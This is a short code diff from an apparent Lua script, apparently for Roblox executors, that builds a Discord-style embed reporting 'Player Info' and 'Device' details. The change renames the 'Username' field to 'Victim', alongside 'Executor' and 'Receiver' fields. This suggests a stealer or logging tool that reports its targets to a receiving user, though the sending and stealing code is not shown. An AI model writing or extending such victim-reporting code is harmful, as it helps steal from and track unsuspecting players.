@@ -356,7 +356,7 @@ local embed = {
     ["fields"] = {
         {
             ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
-            ["value"] = "```lua\nUsername: "..NameValue.."\nExecutor: "..ExecutorValue.."\nReceiver: "..Username.."```"
+            ["value"] = "```lua\nVictim: "..NameValue.."\nExecutor: "..ExecutorValue.."\nReceiver: "..Username.."```"
         },
         {
             ["name"] = "〘:computer:〙**Device**",
